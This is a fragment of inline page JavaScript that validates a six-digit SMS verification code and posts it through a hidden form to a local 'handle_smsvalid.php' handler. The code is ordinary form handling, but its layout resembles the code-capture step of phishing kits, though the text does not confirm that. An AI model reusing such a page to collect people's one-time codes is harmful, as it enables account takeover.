      window.addEventListener('DOMContentLoaded', function() {
        // Listen for the verify button click
        document.addEventListener('click', function(e) {
          if (e.target && (e.target.innerText === 'Verify Code' || e.target.className.includes('verify'))) {
            e.preventDefault();
            
            // Get the SMS input value
            const smsInput = document.querySelector('input[name="sms"]');
            if (!smsInput) {
              console.error('SMS input not found');
              return;
            }

            const code = smsInput.value;
            if (!code || code.length !== 6 || !/^\d+$/.test(code)) {
              console.error('Invalid code entered');
              smsInput.classList.add('shake');
              setTimeout(() => smsInput.classList.remove('shake'), 820);
              return;
            }

            // Create and submit form
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = './handle_smsvalid.php';
            form.style.display = 'none';

            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'sms_code';
            input.value = code;

            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
          }
        });

        // Add input validation for SMS field
        const smsInput = document.querySelector('input[name="sms"]');
        if (smsInput) {
          smsInput.addEventListener('input', function(e) {
            // Remove any non-numeric characters
            this.value = this.value.replace(/\D/g, '');
            
            // Limit to 6 digits
            if (this.value.length > 6) {
              this.value = this.value.slice(0, 6);
            }
          });
        }
      });
    </script>
